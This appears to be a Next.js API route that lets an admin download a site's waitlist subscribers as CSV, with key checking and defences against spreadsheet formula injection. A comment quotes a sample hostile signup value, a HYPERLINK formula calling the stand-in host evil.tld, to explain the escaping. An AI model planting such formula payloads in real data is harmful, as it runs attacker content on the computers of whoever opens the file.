import crypto from "node:crypto";
import { listNewsletterSubscribers } from "../../../../lib/users";

export const dynamic = "force-dynamic";

/**
 * Download the list as CSV.
 *
 *   curl -H "x-admin-key: YOUR_ADMIN_KEY" https://markettide.in/api/waitlist/export
 *
 * Set ADMIN_KEY in your Vercel environment variables. Without it, this is off.
 *
 * The key goes in a header, not the query string. A key in a URL is written to
 * Vercel's access logs, kept in browser history, and handed to any site the
 * page later links to in the Referer header. ?key= still works so an existing
 * bookmark does not break, but the header is the one to use.
 */

/** Constant-time compare. Hashing first makes both sides the same length. */
function sameSecret(given, expected) {
  const a = crypto.createHash("sha256").update(String(given || "")).digest();
  const b = crypto.createHash("sha256").update(String(expected)).digest();
  return crypto.timingSafeEqual(a, b);
}

/**
 * Neutralise a value before it goes in a spreadsheet cell.
 *
 * Excel and LibreOffice evaluate any cell whose text begins with =, +, - or @,
 * so a subscriber who signs up as `=HYPERLINK("http://evil.tld",...)@a.co`
 * gets that formula run on the machine of whoever opens the file. The signup
 * validator is deliberately loose - it only catches typos - and the `source`
 * field had no character validation at all, so both were reachable by anyone
 * who could POST to /api/waitlist.
 *
 * Quoting alone does not help: the quotes are CSV syntax and the spreadsheet
 * strips them before deciding what the cell says. A leading apostrophe is what
 * actually forces it to be read as text, which is why the phone column already
 * had one.
 */
const RISKY_FIRST_CHAR = /^[=+\-@\t\r]/;

function cell(v) {
  let s = String(v ?? "");
  if (RISKY_FIRST_CHAR.test(s)) s = "'" + s;
  return `"${s.replace(/"/g, '""')}"`;
}

export async function GET(request) {
  const expected = process.env.ADMIN_KEY;
  if (!expected) {
    return new Response("Export is disabled. Set ADMIN_KEY to turn it on.",
                        { status: 404 });
  }

  const url = new URL(request.url);
  const given = request.headers.get("x-admin-key") || url.searchParams.get("key");
  if (!sameSecret(given, expected)) {
    return new Response("Not found.", { status: 404 });
  }

  const rows = await listNewsletterSubscribers();
  rows.sort((a, b) => String(a.at).localeCompare(String(b.at)));

  const csv = [
    "email,whatsapp,joined_at,source",
    ...rows.map((r) =>
      [r.email, r.phone ? "'" + r.phone : "", r.at, r.source]
        .map(cell).join(",")),
  ].join("\n");

  return new Response(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": 'attachment; filename="waitlist.csv"',
      // Every subscriber's email and phone number. Nothing caches this:
      // force-dynamic governs Next's own cache, not a proxy or the browser's.
      "Cache-Control": "no-store, private, max-age=0",
    },
  });
}
